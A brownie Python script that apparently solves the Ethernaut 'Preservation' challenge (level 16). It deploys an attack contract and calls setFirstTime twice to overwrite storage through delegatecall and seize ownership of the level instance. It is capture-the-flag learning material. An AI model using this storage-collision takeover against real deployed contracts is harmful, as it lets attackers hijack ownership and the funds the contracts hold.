from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    PreservationAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=16, player=player)

    preservation_contract = interface.IPreservation(instance_address)
    attack_contract = PreservationAttack.deploy({"from": player})

    tx = preservation_contract.setFirstTime(Web3.toBytes(hexstr=str(attack_contract.address)), {"from": player})
    tx.wait(1)
    tx = preservation_contract.setFirstTime(Web3.toBytes(hexstr=str(player)), {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
